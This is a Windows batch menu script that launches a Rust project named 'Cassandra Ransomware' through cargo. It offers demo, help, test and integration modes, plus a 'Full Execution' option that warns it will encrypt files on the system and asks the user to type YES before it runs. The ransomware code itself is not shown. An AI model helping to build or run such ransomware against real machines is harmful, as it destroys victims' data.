@echo off
echo ========================================
echo    Cassandra Ransomware Launcher
echo ========================================
echo.
echo Choose an option:
echo.
echo 1. Safe Demo Mode (Recommended)
echo 2. Show Help
echo 3. Developer Test Mode
echo 4. Integration Test
echo 5. Full Execution (DANGER!)
echo.
set /p choice="Enter your choice (1-5): "

if "%choice%"=="1" goto demo
if "%choice%"=="2" goto help
if "%choice%"=="3" goto test
if "%choice%"=="4" goto integration
if "%choice%"=="5" goto full
echo Invalid choice. Exiting...
pause
exit /b

:demo
echo.
echo Starting Safe Demo Mode...
cargo run -- --demo
goto end

:help
echo.
echo Showing Help...
cargo run -- --help
goto end

:test
echo.
echo Starting Developer Test Mode...
cargo run -- test
goto end

:integration
echo.
echo Starting Integration Test...
cargo run -- integration
goto end

:full
echo.
echo ========================================
echo         ⚠️  EXTREME WARNING ⚠️
echo ========================================
echo.
echo You are about to run the FULL RANSOMWARE!
echo This will ENCRYPT files on your system!
echo.
echo This is EXTREMELY DANGEROUS!
echo Only run in isolated VMs for research!
echo.
set /p confirm="Type 'YES' to confirm: "
if not "%confirm%"=="YES" (
    echo Operation cancelled.
    pause
    exit /b
)
echo.
echo Starting FULL EXECUTION in 5 seconds...
timeout /t 5 /nobreak > nul
cargo run
goto end

:end
echo.
echo Operation completed.
pause